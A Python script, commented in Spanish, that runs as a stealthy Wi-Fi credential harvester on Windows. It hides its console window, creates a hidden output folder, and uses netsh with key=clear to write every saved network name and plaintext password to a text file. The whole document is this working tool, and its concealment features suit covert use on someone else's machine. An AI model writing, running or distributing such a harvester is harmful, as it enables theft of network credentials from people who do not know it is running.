import os
import subprocess
import ctypes
import sys
import threading

def hide_console():
    """Oculta la ventana de la consola usando ctypes en sistemas Windows."""
    if sys.platform == 'win32':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def create_hidden_folder(folder_path):
    """Crea una carpeta oculta si no existe."""
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        # Establecer la carpeta como oculta en sistemas Windows
        subprocess.run(["attrib", "+h", folder_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

def collect_wifi_passwords(output_file):
    """Recoge las redes Wi-Fi guardadas y sus contraseñas (si están disponibles) y las guarda en un archivo."""
    # Obtener los perfiles de Wi-Fi y sus detalles
    profiles_output = subprocess.run(
        ["netsh", "wlan", "show", "profile"],
        capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
    )
    profiles = [line.split(":")[1].strip() for line in profiles_output.stdout.splitlines() if "Perfil de todos los usuarios" in line]

    # Escribir detalles de los perfiles en el archivo
    with open(output_file, "a", encoding="utf-8") as f:
        for ssid in profiles:
            f.write(f"+-- SSID: {ssid}\n|   +-- Detalles:\n")
            
            # Obtener detalles del perfil, incluyendo la contraseña si está disponible
            details_output = subprocess.run(
                ["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"],
                capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
            )
            for line in details_output.stdout.splitlines():
                if ":" in line:
                    key, value = map(str.strip, line.split(":", 1))
                    f.write(f"|       +-- {key}: {value}\n")
            f.write("\n")

def main():
    # Ocultar la ventana de la consola
    hide_console()
    
    # Configuración de la carpeta y archivo de salida
    output_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "WIFI-PASSWORDS")
    output_file = os.path.join(output_folder, "wifi-passwords-resuelto.txt")
    
    # Crear la carpeta oculta "WIFI-PASSWORDS" si no existe
    create_hidden_folder(output_folder)
    
    # Escribir encabezado en el archivo de salida
    with open(output_file, "w", encoding="utf-8") as f:
        f.write("Listado de redes Wi-Fi y detalles guardados:\n")
        f.write("-----------------------------------------------------------\n")
    
    # Ejecutar la recolección de contraseñas Wi-Fi en segundo plano
    wifi_thread = threading.Thread(target=collect_wifi_passwords, args=(output_file,))
    wifi_thread.daemon = True  # Esto permite que el hilo se cierre automáticamente cuando termine el script
    wifi_thread.start()

    # Dejar que el script se ejecute en segundo plano sin hacer nada más
    wifi_thread.join()

# Ejecutar la función principal
if __name__ == "__main__":
    main()
